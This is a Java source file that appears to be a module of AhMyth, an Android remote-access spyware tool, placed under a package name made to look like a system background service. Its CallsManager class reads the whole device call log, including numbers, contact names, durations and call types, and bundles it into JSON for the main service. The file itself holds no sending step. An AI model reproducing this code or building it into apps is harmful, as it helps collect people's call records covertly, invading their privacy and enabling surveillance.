package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import com.android.background.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/11/16.
 */

public class CallsManager {

    public static JSONObject getCallsLogs(){

        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

//            Uri allCalls = Uri.parse("content://call_log/calls");
            Uri allCalls = CallLog.Calls.CONTENT_URI;

            @SuppressLint("Recycle") Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
                @SuppressLint("Range") int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            return Calls;
        }
        catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

}
